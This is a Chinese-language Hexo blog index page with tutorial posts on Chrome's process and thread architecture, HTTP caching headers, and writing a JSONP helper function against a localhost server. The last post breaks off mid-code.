<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
  
<meta name="generator" content="Hexo 7.0.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
        
          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
        
        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-ZH002" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/07/18/ZH002/" class="article-date">
  <time class="dt-published" datetime="2021-07-18T14:10:23.000Z" itemprop="datePublished">2021-07-18</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/07/18/ZH002/">浏览器中的进程</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="一、浏览器中的进程"><a href="#一、浏览器中的进程" class="headerlink" title="一、浏览器中的进程"></a>一、浏览器中的进程</h2><img src="1.png" style="zoom:50%;">
上图最新的 Chrome 浏览器架构图，从图中可以看出，最新的 Chrome 浏览器包括：1 个浏览器（Browser）主进程、1 个 GPU 进程、1 个网络（NetWork)进程、多个渲染进程和多个插件进程。

<h3 id="①-浏览器进程（Browser-进程）"><a href="#①-浏览器进程（Browser-进程）" class="headerlink" title="① 浏览器进程（Browser 进程）"></a>① 浏览器进程（Browser 进程）</h3><p>浏览器的主进程，负责主控、协调，只有一个（无论打开几个 tab 或几个弹窗）。</p>
<h5 id="主要作用："><a href="#主要作用：" class="headerlink" title="主要作用："></a>主要作用：</h5><ul>
<li>负责各个页面的管控，创建和销毁其他进程</li>
<li>将 Render 进程得到的内存中的 Bitmap，绘制到用户界面上</li>
<li>网络资源的下载、管理等</li>
</ul>
<h3 id="②-GPU-进程"><a href="#②-GPU-进程" class="headerlink" title="② GPU 进程"></a>② GPU 进程</h3><p>GPU（图形处理器）。<br>Chrome 刚开始发布的时候是没有 GPU 进程的，而 GPU 的使用初衷是为了实现 3D CSS 的效果，只是随后网页、Chrome 的 UI 界面都选择采用 GPU 来绘制，这使得 GPU 成为浏览器普遍的需求。最后，Chrome 在其多进程架构上也引入了 GPU 进程。</p>
<h3 id="③-插件进程"><a href="#③-插件进程" class="headerlink" title="③ 插件进程"></a>③ 插件进程</h3><p>主要负责插件的运行。因为插件容易崩溃，所以需要通过插件进程来隔离，以保证插件进程的崩溃不会对浏览器和页面造成影响。<br>每种类型的插件对应一个进程，仅当使用该插件时才创建。</p>
<h3 id="④-网络进程"><a href="#④-网络进程" class="headerlink" title="④ 网络进程"></a>④ 网络进程</h3><p>主要负责页面的网络资源加载，之前是作为一个模块运行在浏览器进程里面的，最近几年才独立出来，成为一个单独的进程。</p>
<h3 id="⑤-浏览器渲染进程（浏览器内核）"><a href="#⑤-浏览器渲染进程（浏览器内核）" class="headerlink" title="⑤ 浏览器渲染进程（浏览器内核）"></a>⑤ 浏览器渲染进程（浏览器内核）</h3><p>浏览器渲染进程（Render 进程），即通常说的浏览器内核。<br>主要作用：页面渲染、脚本执行、事件处理。<br><em>每个 tab 页的打开都会创建一个 Render 进程，并且互不影响 。默认一个 tab 页对应一个 Render 进程，但是有时候浏览器会将多个进程进行合并，例如打开了多个空白标签页。</em></p>
<h3 id="浏览器为什么多进程的？"><a href="#浏览器为什么多进程的？" class="headerlink" title="浏览器为什么多进程的？"></a>浏览器为什么多进程的？</h3><p>如果多个页面共享一个进程，那么在某个 tab 页崩溃时，将导致同进程中的其他页面也崩溃，及其影响用户体验。<br>而且进程之间不会共享资源和地址空间，所以不会存在太多安全问题。<br>当然，多进程相对于单进程而言，内存等资源的消耗更大。</p>
<h2 id="二、浏览器内核中的线程"><a href="#二、浏览器内核中的线程" class="headerlink" title="二、浏览器内核中的线程"></a>二、浏览器内核中的线程</h2><p>它包含一下5种线程：</p>
<h3 id="①-GUI-渲染线程（有且仅有一个）"><a href="#①-GUI-渲染线程（有且仅有一个）" class="headerlink" title="① GUI 渲染线程（有且仅有一个）"></a>① GUI 渲染线程（有且仅有一个）</h3><p>负责渲染浏览器界面，解析 HTML、CSS，构建 DOM 树、RenderObject树，布局、绘制等。<br>当页面需要重绘或者回流时，此程序就会执行。<br><em><em>GUI 线程和 JS 引擎线程互斥！！！</em></em><br>当 JS 引擎线程执行时，GUI 线程就会被挂起（相当于被冻结了），GUI  更新会被保存在一个队列中，等到 JS 引擎空闲时，立即被执行。</p>
<h5 id="为什么-JS-引擎执行的时候-GUI-线程要被挂起？"><a href="#为什么-JS-引擎执行的时候-GUI-线程要被挂起？" class="headerlink" title="为什么 JS 引擎执行的时候 GUI 线程要被挂起？"></a>为什么 JS 引擎执行的时候 GUI 线程要被挂起？</h5><p>因为 JS 可以操作 DOM，如果可以在修改 DOM 的同时渲染页面，那么 GUI 渲染线性前后获得的元素数据就可能不一致。</p>
<h3 id="②-JS-渲染引擎（有且只有一个）"><a href="#②-JS-渲染引擎（有且只有一个）" class="headerlink" title="② JS 渲染引擎（有且只有一个）"></a>② JS 渲染引擎（有且只有一个）</h3><p>JS 引擎线程也称为 JS 内核，负责处理 JS 脚本程序，解析 JS 脚本，运行代码。<br>JS 引擎一直等待着任务队列中任务的到来，然后加以处理。<br>因为 GUI 线程和 JS 引擎线程互斥，因此 JS 加载时间过长时，会造成页面渲染不连贯，导致页面加载阻塞。这就是为什么建议将 <code>&lt;script&gt;</code> 标签写在 body 的最末端的原因。</p>
<h3 id="③-事件触发线程"><a href="#③-事件触发线程" class="headerlink" title="③ 事件触发线程"></a>③ 事件触发线程</h3><p>事件触发线程归属于浏览器，而不属于 JS 引擎，JS 引擎处理的事务过多，需要浏览器开线程来进行协助。<br><em>JS 是采用事件驱动机制来响应用户操作的，事件触发进程是通过维护事件循环和事件队列等方式，来响应和处理事件。</em><br>当处理一些不能立即执行的函数或代码时，会将对应的任务在其可以触发的的时机，添加到事件队列的末端。<br>事件循环机制会在 JS 引擎空闲时，循环访问事件队列的头部，如果有函数或代码，则会将其推入执行栈中并立即执行。</p>
<h3 id="④-定时器触发线程（多个）"><a href="#④-定时器触发线程（多个）" class="headerlink" title="④ 定时器触发线程（多个）"></a>④ 定时器触发线程（多个）</h3><p>即 setInterval 与 setTimeout 所在的线程。<br>浏览器定时计数器并不是由 JS 引擎计数的，因为 JS 引擎是单线程的，如果处于阻塞线程状态就会影响计时器的准确性。<br>因此需要使用单独的线程来计时并触发定时器，计时完成后，添加到事件队列中，等待 JS 引擎空闲后执行。所以， <em>定时器中的任务在设定的时间不一定能够准时执行，定时器只是在指定的时间点将任务添加到事件队列中</em> 。</p>
<h5 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h5><p>W3C 在 HTML 标准中规定，定时器的定时时间不能小于 4ms，如果是小于 4ms，则默认为 4ms。</p>
<h3 id="⑤-异步-HTTP-请求线程（多个）"><a href="#⑤-异步-HTTP-请求线程（多个）" class="headerlink" title="⑤ 异步 HTTP 请求线程（多个）"></a>⑤ 异步 HTTP 请求线程（多个）</h3><p>XMLHttpRequest 连接后，通过浏览器开一个新的线程进行请求。<br>检测到状态变更时，如果设置有回调函数，异步 HTTP 请求线程就会产生状态变更事件，将回调函数放入事件队列中，等待 JS 引擎空闲后执行。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/07/18/ZH002/" data-id="clur520r0002dmocc8nftcaks" data-title="浏览器中的进程" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%BB%BC%E5%90%88/" rel="tag">综合</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-HTTP013" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/06/26/HTTP013/" class="article-date">
  <time class="dt-published" datetime="2021-06-26T09:41:53.000Z" itemprop="datePublished">2021-06-26</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/06/26/HTTP013/">HTTP缓存</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>当客户端向服务器请求资源时，会先抵达浏览器缓存，如果浏览器中有要请求资源的副本，就可以直接从浏览器缓存中提取，而不是向原始服务器请求这个资源。</p>
<p>常见的 HTTP 缓存只能缓存 GET 请求响应的资源，对其他类型的响应无能为力，因此后续说的请求缓存指的都是 GET 请求。</p>
<p>HTTP 缓存都是从第二次请求开始的。第一次请求资源时，服务器返回资源，并在 response header 中回传资源的缓存参数。第二次请求时，浏览器判断这些请求参数，命中强缓存则直接返回 200；否则把请求参数添加到 request header 中传给服务器，看是否命中协商缓存，命中则返回 304；否则服务器就会返回新的资源。</p>
<h2 id="二、HTTP-缓存的分类"><a href="#二、HTTP-缓存的分类" class="headerlink" title="二、HTTP 缓存的分类"></a>二、HTTP 缓存的分类</h2><p>根据是否需要重新向服务器发起请求进行分类， 可分为：强缓存、协商缓存。</p>
<p>根据式被单个用户室友还是多个用户使用进行分类，可分为：私有缓存、共享缓存。</p>
<p>强缓存如果生效，则不再需要再和服务器进行交互。协商缓存无论是否生效，都需要与服务器进行交互。</p>
<img src="1.png" style="zoom:50%;">

<h3 id="2-1-强缓存"><a href="#2-1-强缓存" class="headerlink" title="2.1 强缓存"></a>2.1 强缓存</h3><p>强缓存在缓存数据未失效的情况下，会直接使用浏览器的缓存数据，不会再向服务器发送任何请求。强缓存生效时，HTTP 状态码为 200。这种方式页面的加载速度是最快的，性能也是很好的，但是在这期间，如果服务端的资源修改了，浏览器是拿不到的，因为它不会再向服务器发送请求了。这种情况在我们的开发中经常遇到，因为走的是强缓存，所以一般 Ctrl+F5 一顿操作之后就好了。</p>
<p>与强缓存相关的 header 头有：Pragma、Cache-Control、Expires。</p>
<h4 id="①-Pragma"><a href="#①-Pragma" class="headerlink" title="① Pragma"></a>① Pragma</h4><p>Pragma 是 HTTP&#x2F;1.1 之前版本的历史遗留字段，仅作为与 HTTP&#x2F;1.0 的向后兼容而定义。规范定义的形式唯一，如下所示。</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br></pre></td></tr></table></figure>

<p>该首部字段属于通用首部字段，但只用在客户端发送的请求中。客户端会要求所有的中间服务器不返回缓存的资源。</p>
<p>所有的中间服务器如果都能以 HTTP&#x2F;1.1 为基准，那直接采用 Cache-Control: no-cache 指定缓存的处理方式是最为理想的。但要整体掌握全部中间服务器使用的 HTTP 协议版本却是不现实的。因此，发送的请求会同时含有下面两个首部字段：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br></pre></td></tr></table></figure>

<h4 id="②-Cache-control"><a href="#②-Cache-control" class="headerlink" title="② Cache-control"></a>② Cache-control</h4><p>Cache-control 为通用首部字段，通过指定 Cache-control 的指令，就能操作缓存的工作机制。指令的参数是可选的，多个请求之间通过 “,” 分割。Cache-control 的指令可用于请求时及响应时。例如：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Cache-control</span><span class="punctuation">: </span>private, max-age=0, no-cache</span><br></pre></td></tr></table></figure>

<p>Cache-control 常用指令：</p>
<ul>
<li><code>public</code>：表明其他用户也可以利用缓存。</li>
</ul>
<ul>
<li><p><code>private</code>：缓存服务器只对特定用户提供资源缓存的服务，对于其他用户发送过来的请求，代理服务器则不会返回缓存。</p>
</li>
<li><p><code>no-cache</code>：客户端不会接收缓存过的响应，强制向源服务器再次验证。</p>
</li>
<li><p><code>no-store</code>：不能缓存请求或响应的任何内容。</p>
</li>
<li><p><code>max-age=xxx[秒]</code>：缓存内容将在 xxx 秒后失效。应用 HTTP&#x2F;1.1 版本的缓存服务器，在同时遇到 max-age 指令和 Expires 首部字段时，会优先处理 max-age 指令，而忽略 Expires。而 HTTP&#x2F;1.0 版本的缓存服务器的情况则相反，max-age 指令会被忽略。</p>
</li>
</ul>
<h4 id="③-Expires"><a href="#③-Expires" class="headerlink" title="③ Expires"></a>③ Expires</h4><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Expires</span><span class="punctuation">: </span>Wed, 04 Jul 2021 08:26:05 GMT</span><br></pre></td></tr></table></figure>

<p>首部字段 Expires 会将资源失效的日期告知客户端。缓存服务器在接收到含有首部字段 Expires 的响应后，会以缓存来应答请求，在 Expires 字段值指定的时间之前，响应的副本会一直被保存。当超过指定的时间后，缓存服务器在请求发过来时，会转向源服务器请求资源。</p>
<p>源服务器不希望缓存服务器对资源缓存时，最好在 Expires 字段内写入与首部字段 Date 相同的值。</p>
<h5 id="Expires-存在的问题：服务器与客户端的时间不一致会出现问题。"><a href="#Expires-存在的问题：服务器与客户端的时间不一致会出现问题。" class="headerlink" title="Expires 存在的问题：服务器与客户端的时间不一致会出现问题。"></a>Expires 存在的问题：服务器与客户端的时间不一致会出现问题。</h5><p>到了 HTTP&#x2F;1.1，Expires 已经被 Cache-Control 替代，原因在于 Expires 控制缓存的原理是<strong>使用客户端的时间与服务端返回的时间做对比</strong>，如果客户端与服务端的时间由于某些原因（时区不同、客户端和服务端有一方的时间不准确）发生误差，强制缓存就会直接失效，那么强制缓存的存在就毫无意义。</p>
<h3 id="2-2-协商缓存"><a href="#2-2-协商缓存" class="headerlink" title="2.2 协商缓存"></a>2.2 协商缓存</h3><p>当第一次请求时，服务器返回的响应头中 (1)没有 Cache-Control 和 Expires 或 (2)Cache-Control 的设置为 no-cache 或 (3)Cache-Control 和 Expires 过期了，那么浏览器第二次请求时就会与服务器进行协商，与服务器对比判断资源是否进行了修改更新。如果服务器的资源没有修改，那么就会返回 304 状态码。告诉浏览器可以使用缓存中的数据，这样就减少了服务器数据传输的压力。如果数据有更新，就会返回 200 状态码，服务器就会返回更新后的资源，并将缓存信息一起返回。</p>
<p>与协商缓存相关的 header 头有：ETag&#x2F;If-None-Match 、Last-Modified&#x2F;If-Modified-Since，请求头和响应头需要成对出现。</p>
<h4 id="①-ETag"><a href="#①-ETag" class="headerlink" title="① ETag"></a>① ETag</h4><p>ETag 能告知客户端实体标记。它是一种可将资源以字符串形式做唯一性标识的方式。服务器会为每份资源分配对应的 ETag 值。</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ETag</span><span class="punctuation">: </span>“5b2a6fb4-3166”</span><br></pre></td></tr></table></figure>

<p>当资源更新时，ETag 值也需要更新。生成 ETag 值并没有统一的算法规则，而仅仅是由服务器来分配。</p>
<p>资源被缓存时，就会分配唯一性标识。例如，当使用中文版浏览器访问谷歌时，就会返回中文版对应的资源，而使用英文版的浏览器访问时，就会返回英文版对应的资源。两者的 URL 是相同的，所以仅凭 URI 指定缓存的资源是相当困难的。若在下载过程中出现中断、再连接的情况，都会依照 ETag 值来指定资源。</p>
<p>ETag 中有强 ETag 值和弱 ETag 值之分：</p>
<ul>
<li>强 ETag：无论实体发生多么细微的变换都会改变其值。</li>
<li>弱 ETag：只用于提示资源是否相同，只有资源发生了根本改变，ETag 值才会改变。这时会在字段最开始处附加 W&#x2F;。</li>
</ul>
<h4 id="②-If-None-Match"><a href="#②-If-None-Match" class="headerlink" title="② If-None-Match"></a>② If-None-Match</h4><p>服务器会比对 If-None-Match 的字段值和资源的 Etag 值，若不一致，则服务器处理该请求。</p>
<h4 id="③-Last-Modified"><a href="#③-Last-Modified" class="headerlink" title="③ Last-Modified"></a>③ Last-Modified</h4><p>Last-Modified 指定资源最终修改的时间。</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Last-Modified</span><span class="punctuation">: </span>Wed, 04 Jul 2021 08:26:05 GMT</span><br></pre></td></tr></table></figure>

<h4 id="④-If-Modified-Since"><a href="#④-If-Modified-Since" class="headerlink" title="④ If-Modified-Since"></a>④ If-Modified-Since</h4><p>若资源在 If-Modified-Since 指定的时间之后更新过，则服务器处理该请求。否则服务器返回 304 状态码。</p>
<p>If-Modified-Since 用于确认代理或客户端拥有的本地资源的有效性。获取资源的更新日期时间，可以通过首部字段 Last-Modified 来确定。</p>
<h4 id="ETag-x2F-If-Not-Match-是在-HTTP-x2F-1-1-出现的，主要是解决以下问题："><a href="#ETag-x2F-If-Not-Match-是在-HTTP-x2F-1-1-出现的，主要是解决以下问题：" class="headerlink" title="ETag&#x2F;If-Not-Match 是在 HTTP&#x2F;1.1 出现的，主要是解决以下问题："></a>ETag&#x2F;If-Not-Match 是在 HTTP&#x2F;1.1 出现的，主要是解决以下问题：</h4><ol>
<li>Last-Modified 标注的最后修改时间只能精确到秒级，如果某些文件在 1 秒钟以内，被修改多次的话，它将不能准确标注文件的修改时间。</li>
<li>如果某些文件被修改了，但是内容并没有任何变化，而 Last-Modified 却改变了，导致文件没法使用缓存。</li>
<li>有可能存在服务器没有准确获取文件修改时间，或者与代理服务器时间不一致等情形。</li>
</ol>
<img src="2.png" style="zoom:50%;">

<h3 id="2-3-私有缓存（浏览器级缓存）"><a href="#2-3-私有缓存（浏览器级缓存）" class="headerlink" title="2.3 私有缓存（浏览器级缓存）"></a>2.3 私有缓存（浏览器级缓存）</h3><p>私有缓存只能用于特定的用户：<code>Cache-Control: Private</code></p>
<h3 id="2-4-共享缓存（代理级缓存）"><a href="#2-4-共享缓存（代理级缓存）" class="headerlink" title="2.4 共享缓存（代理级缓存）"></a>2.4 共享缓存（代理级缓存）</h3><p>共享缓存可以被多个用户使用：<code>Cache-Control: Public</code></p>
<h2 id="三、HTTP-缓存的有点"><a href="#三、HTTP-缓存的有点" class="headerlink" title="三、HTTP 缓存的有点"></a>三、HTTP 缓存的有点</h2><ol>
<li>减缓了服务器的压力，提高了网站的性能</li>
<li>加快了客户端加载网页的速度</li>
<li>减少了冗余的数据传输，节省了网费，降低了网络拥塞</li>
</ol>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/06/26/HTTP013/" data-id="clur520r0002bmocc0hladlf4" data-title="HTTP缓存" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/HTTP/" rel="tag">HTTP</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-HTTP012" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/05/31/HTTP012/" class="article-date">
  <time class="dt-published" datetime="2021-05-31T08:11:49.000Z" itemprop="datePublished">2021-05-31</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/05/31/HTTP012/">JSONP</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p><a target="_blank" rel="noopener" href="http://keeppassion.me/2021/02/04/HTTP004/">http://keeppassion.me/2021/02/04/HTTP004/</a></p>
<p>在上述博客中，已经讲解了同源政策与 JSONP，这边博客我们将对 JSONP 的代码进行优化，并封装成函数。</p>
<h2 id="一、动态发送请求"><a href="#一、动态发送请求" class="headerlink" title="一、动态发送请求"></a>一、动态发送请求</h2><p>我们先看一下之前的代码：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">function</span> <span class="title function_">fn</span> (data) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;客户端的fn函数被调用了&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(data);</span></span><br><span class="line"><span class="language-javascript">  &#125;    </span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 1.将非同源服务器端的请求地址写在script标签的src属性中 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://localhost:3001/test&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>我们可以看出，请求在访问页面的时候就被立刻发送了。但是我们可能并不想请求立刻被发送，而是想发送时再发送，例如点击一个按钮时再发送，实现动态发送。</p>
<h4 id="解决方案："><a href="#解决方案：" class="headerlink" title="解决方案："></a>解决方案：</h4><ol>
<li>点击按钮后动态创建 script 标签，并设置 src 属性；</li>
<li>将 script 标签追加到页面中，<strong>请求是在 script 标签追加至页面之后发送的</strong>；</li>
<li>在 script 标签加载完毕后，将 script 标签标签移除。（避免点击一次就追加一个 script 标签，最后放进去了很多 script 标签，这样并不好）</li>
</ol>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;btn&quot;</span>&gt;</span>点我发送请求<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">fn</span> (data) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;客户端的fn函数被调用了&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">console</span>.<span class="title function_">log</span>(data);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> btn = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;btn&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    btn.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">var</span> script = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;script&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">      script.<span class="property">src</span> = <span class="string">&#x27;http://localhost:3001/test&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(script);</span></span><br><span class="line"><span class="language-javascript">      script.<span class="property">onload</span> = <span class="function">()=&gt;</span>&#123;<span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">removeChild</span>(script)&#125;;</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="二、函数名称问题"><a href="#二、函数名称问题" class="headerlink" title="二、函数名称问题"></a>二、函数名称问题</h2><p>上面我们只定义了一个函数 fn，但实际上会定义多个函数用于接收数据、处理数据。因此需要告知服务器端返回哪个函数的调用，故将函数名称作为参数传递过去。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">script.<span class="property">src</span> = <span class="string">&#x27;http://localhost:3001/test?callback=fn&#x27;</span>;</span><br></pre></td></tr></table></figure>

<h2 id="三、封装-jsonp-函数"><a href="#三、封装-jsonp-函数" class="headerlink" title="三、封装 jsonp 函数"></a>三、封装 jsonp 函数</h2><p>现在我们对 jsonp 进行封装。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">jsonp</span>(<span class="params">options</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> script = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;script&#x27;</span>);</span><br><span class="line">  script.<span class="property">src</span> = options.<span class="property">url</span>;</span><br><span class="line">  <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(script);</span><br><span class="line">  script.<span class="property">onload</span> = <span class="function">()=&gt;</span>&#123;<span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">removeChild</span>(script)&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>再调用一下。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> btn = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;btn&#x27;</span>);</span><br><span class="line">btn.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="title function_">jsonp</span>(&#123; <span class="attr">url</span>: <span class="string">&#x27;http://localhost:3001/test?callback=fn&#x27;</span> &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<h2 id="四、优化-jsonp-函数"><a href="#四、优化-jsonp-函数" class="headerlink" title="四、优化 jsonp 函数"></a>四、优化 jsonp 函数</h2><p>我们上面的做法存在3个问题：</p>
<ul>
<li>问题1：我们定义了 jsonp 函数用于发送请求，然后还需要 fn 函数来接收数据、处理数据，以至于发送一个请求需要使用两个函数。而且两个函数是独立的，破坏了封装性。因此我们希望将接收数据的函数写进 jsonp 函数的实参里，作为回调函数使用。</li>
<li>问题2：我们可能需要发送多个请求，每个请求都需要一个回调函数来处理服务器响应的结果，取名字也是一件头疼的事情。因此我们可以让函数的名字随机产生。</li>
<li>问题3：我们希望 jsonp 函数能够传递参数。</li>
</ul>
<p>改进后的 jsonp 函数：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">jsonp</span>(<span class="params">options</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> script = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span 